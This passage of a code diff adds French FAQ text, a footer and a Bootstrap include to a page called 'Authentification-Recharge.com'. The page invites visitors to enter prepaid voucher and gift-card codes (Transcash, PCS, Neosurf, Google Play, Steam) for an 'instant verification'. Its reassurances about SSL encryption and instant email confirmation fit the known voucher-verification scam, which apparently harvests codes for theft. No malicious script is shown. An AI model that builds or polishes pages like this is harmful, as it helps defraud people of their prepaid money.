+                  Il vous suffit d’entrer le code de votre ticket sur le formulaire dédié. Notre système analyse instantanément l’état d’activité du code, et vous recevez une confirmation immédiate sur votre boîte mail.
+                </div>
+              </div>
+            </div>
+            <!-- FAQ 3 -->
+            <div class="accordion-item">
+              <h2 class="accordion-header">
+                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq3" data-i18n="faq3_q">
+                  Quels types de tickets puis-je vérifier ici ?
+                </button>
+              </h2>
+              <div id="faq3" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                <div class="accordion-body text-muted small" data-i18n="faq3_r">
+                  Nous prenons en charge les émetteurs leaders comme Transcash, PCS ou Neosurf, ainsi que les codes de divertissement (Google Play, Amazon, Steam, PlayStation). La liste est continuellement mise à jour.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="text-center">
+    <div class="container">
+      <p class="mb-0" data-i18n="footer_copyright">&copy; 2026 Authentification-Recharge.com — Tous droits réservés. Connexion chiffrée SSL.</p>
     </div>
   </footer>
 
-  <script src="bootstrap.bundle.min.js"></script>
-  <script src="script.js"></script>
+  <!-- Bootstrap 5 JS Bundle -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
